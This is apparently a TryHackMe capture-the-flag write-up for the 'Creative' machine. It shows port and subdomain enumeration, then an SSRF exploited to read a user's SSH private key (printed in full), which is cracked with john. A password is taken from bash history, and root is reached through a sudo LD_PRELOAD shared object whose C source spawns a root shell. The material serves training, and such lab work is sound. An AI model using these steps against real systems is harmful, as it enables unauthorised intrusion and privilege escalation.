
# Creative

#ssrf #dnsenum 

https://tryhackme.com/room/creative

Exploit a vulnerable web application and some misconfigurations to gain root privileges.

# Task 1 - boot2root


## Escaneo

```
nmap -n -Pn -sV --min-rate 1000 -v -p- -oN nmap 10.82.178.97
 
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 139.65 seconds
           Raw packets sent: 131159 (5.771MB) | Rcvd: 1857 (438.660KB)
```


```
 curl -I creative.thm
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 25 Dec 2025 16:19:03 GMT
Content-Type: text/html
Content-Length: 37589
Last-Modified: Fri, 16 Aug 2019 01:38:36 GMT
Connection: keep-alive
ETag: "5d56091c-92d5"
Accept-Ranges: bytes
```

## Directorios

```
ffuf -u http://creative.thm/FUZZ  -w /usr/share/wordlists/directory-list-2.3-medium.txt -ic -t 500 -e .php,.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://creative.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/directory-list-2.3-medium.txt
 :: Extensions       : .php .txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 500
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 37589, Words: 14867, Lines: 686, Duration: 210ms]
assets                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 188ms]
                        [Status: 200, Size: 37589, Words: 14867, Lines: 686, Duration: 192ms]
:: Progress: [542911/661641] :: Job [1/1] :: 2582 req/sec :: Duration: [0:03:45] :: Errors: 0 ::
```

## Subdominios

```
ffuf -u http://creative.thm -c -w subdomains-top1million-110000.txt -H 'Host: FUZZ.creative.thm' -fs 0 -fc 301

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://creative.thm
 :: Wordlist         : FUZZ: /root/hackdata/tryhackme/creaative/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.creative.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 301
 :: Filter           : Response size: 0
________________________________________________

beta                    [Status: 200, Size: 591, Words: 91, Lines: 20, Duration: 187ms]
:: Progress: [1639/114442] :: Job [1/1] :: 249 req/sec :: Duration: [0:00:07] :: Errors: 0 ::

```

```
http://beta.creative.thm/

```


```

cat req
POST / HTTP/1.1
Host: beta.creative.thm
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Origin: http://beta.creative.thm
Connection: keep-alive
Referer: http://beta.creative.thm/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

url=hola

```

```
python3 ssrfmap.py -r req -p url -m portscan
 _____ _________________                     
/  ___/  ___| ___ \  ___|                    
\ `--.\ `--.| |_/ / |_ _ __ ___   __ _ _ __  
 `--. \`--. \    /|  _| '_ ` _ \ / _` | '_ \ 
/\__/ /\__/ / |\ \| | | | | | | | (_| | |_) |
\____/\____/\_| \_\_| |_| |_| |_|\__,_| .__/ 
                                      | |    
                                      |_|    
[INFO]:Module 'portscan' launched !
	[17:33:03] IP:127.0.0.1   , Found filtered  port n°23                    
	[17:33:03] IP:127.0.0.1   , Found open      port n°80                    
	[17:33:03] IP:127.0.0.1   , Found filtered  port n°443                    
	[17:33:04] IP:127.0.0.1   , Found filtered  port n°22     
	
	[17:35:52] IP:127.0.0.1   , Found open      port n°1337 
```

```
http://127.0.0.1:1337


http://127.0.0.1:1337/home/saad/.ssh/id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----
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
ksrXEYjaMdndnvxBZ0zi9T+ywag=
-----END OPENSSH PRIVATE KEY-----




```


```
nano id_rsa
                                                                                                                                                                                 
┌──(kali㉿kali)-[~/tmp]
└─$ ssh2john id_rsa > id_hash
                                                                                                                                                                                 
┌──(kali㉿kali)-[~/tmp]
└─$ john hash -w=/usr/share/wordlists/rockyou.txt  id_hash         
stat: hash: No such file or directory
                                                                                                                                                                                 
┌──(kali㉿kali)-[~/tmp]
└─$ john id_hash -w=/usr/share/wordlists/rockyou.txt   
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sweetness        (id_rsa)     
1g 0:00:00:41 DONE (2025-12-25 11:43) 0.02418g/s 23.21p/s 23.21c/s 23.21C/s xbox360..sandy
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                                                                                 
┌──(kali㉿kali)-[~/tmp]
└─$ 

```


```
ssh -i id_rsa saad@creative.thm
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu 25 Dec 2025 05:45:05 PM UTC

  System load:  0.0               Processes:             112
  Usage of /:   62.8% of 8.02GB   Users logged in:       0
  Memory usage: 51%               IPv4 address for ens5: 10.82.178.97
  Swap usage:   0%

 * Ubuntu 20.04 LTS Focal Fossa will reach its end of standard support on 31 May
 
   For more details see:
   https://ubuntu.com/20-04

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Your Hardware Enablement Stack (HWE) is supported until April 2025.

Last login: Mon Nov  6 07:56:40 2023 from 192.168.8.102
saad@ip-10-82-178-97:~$ 

```

```
cat user.txt 
9a1ce90a7653d74ab98630b47b8b4a84

```

```
saad@ip-10-82-178-97:~$ cat .bash_history 
whoami
pwd
ls -al
ls
cd ..
sudo -l
echo "saad:MyStrongestPasswordYet$4291" > creds.txt
rm creds.txt
sudo -l
whomai
whoami
pwd
ls -al
sudo -l
ls -al
pwd
whoami
mysql -u root -p
netstat -antlp
mysql -u root
sudo su
ssh root@192.169.155.104
mysql -u user -p
mysql -u db_user -p
ls -ld /var/lib/mysql
ls -al
cat .bash_history 
cat .bash_logout 
nano .bashrc 
ls -al

```


```
MyStrongestPasswordYet$4291

sudo -l
[sudo] password for saad:
Matching Defaults entries for saad on ip-10-81-191-142:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User saad may run the following commands on ip-10-81-191-142:
    (root) /usr/bin/ping
    
 


```

```
cat pe.c

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```
 gcc -fPIC -shared -o pe.so pe.c -nostartfiles
saad@ip-10-81-191-142:~$

```

```
sudo LD_PRELOAD=./pe.so /usr/bin/ping

 sudo LD_PRELOAD=./pe.so /usr/bin/ping
root@ip-10-81-191-142:/home/saad# cd /root
root@ip-10-81-191-142:~# cat root.txt
992bfd94b90da48634aed182aae7b99f


```



# Referencias
## Writeups
- https://0xb0b.gitbook.io/writeups/tryhackme/2024/creative

## Otros
- https://github.com/swisskyrepo/SSRFmap